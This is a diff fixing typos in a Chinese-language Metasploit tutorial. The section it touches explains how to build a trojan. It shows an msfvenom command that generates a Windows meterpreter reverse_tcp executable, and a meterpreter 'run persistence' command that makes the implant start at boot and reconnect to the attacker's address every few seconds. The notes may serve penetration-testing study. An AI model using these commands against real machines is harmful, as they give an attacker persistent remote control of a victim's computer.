@@ -646,7 +646,7 @@ set exitonsession false: 支持多線呈操作
 
 ### 4. 製作木馬
 ```cmd
-msfvenom -p windows/x64/meterpeter/reverse_tcp -f exe -a x64 --platform windows -o ./demo.exe lhost=ip lport=port 
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -a x64 --platform windows -o ./demo.exe lhost=ip lport=port 
 ```
 - -p: payload 使用的漏洞
 - -f: file 輸出格式
@@ -680,7 +680,7 @@ run
 - show advanced: 顯示高級指令
 - 第一次連線完成後: 出現 meterpreter > 後執行以下指令
 ```cmd
-run persistence -X -i 5 -p 4444 -r (ip)
+run persistence -X -i 5 -p 4444 -r [ip]
 ```
 - -X: 開機後自動啟動木馬
 - -i: 目標每隔幾秒自動連線
